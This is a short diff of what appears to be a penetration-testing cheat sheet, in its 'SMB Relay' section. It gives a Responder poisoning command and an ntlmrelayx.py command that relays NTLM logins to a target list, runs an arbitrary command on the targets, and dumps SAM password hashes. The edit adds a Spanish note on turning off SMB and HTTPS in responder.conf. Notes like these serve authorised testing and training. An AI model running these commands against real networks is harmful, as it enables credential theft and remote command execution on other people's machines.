@@ -106,7 +106,7 @@ SMB Relay
 ```
 responder -I  NETINTERFACE rdw
 ```
-NTLM Relay (SAM dumping without 'c' flag)
+NTLM Relay [responder.conf con smb y https en "off" (SAM dumping without 'c' flag)]
 
 ```
 python3 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
